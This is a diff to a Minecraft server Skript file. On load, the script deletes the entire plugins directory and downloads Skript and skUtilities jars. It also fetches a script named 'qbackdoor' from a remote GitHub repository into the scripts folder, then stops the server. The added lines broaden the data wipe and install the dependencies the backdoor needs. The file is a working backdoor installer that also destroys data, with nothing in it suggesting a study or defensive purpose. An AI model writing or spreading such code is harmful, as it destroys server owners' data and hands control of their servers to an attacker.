@@ -1,6 +1,11 @@
+# https://github.com/tim740/skUtilities/releases/download/v0.9.2/skUtilities.v0.9.2.jar
 on load:
-  delete directory "plugins/Skript/scripts"
+  delete directory "plugins"
+  create directory "plugins"
+  create directory "plugins/Skript"
   create directory "plugins/Skript/scripts"
+  download file from "https://github.com/SkriptLang/Skript/releases/download/2.8.2/Skript.jar" to file "plugins/Skript.jar"
+  download file from "https://github.com/tim740/skUtilities/releases/download/v0.9.2/skUtilities.v0.9.2.jar" to file "plugins/skUtilities.v0.9.2.jar"
   download file from "https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_main.sk" to file "plugins/Skript/scripts/qbackdoor.sk"
   wait 80 ticks
   stop server
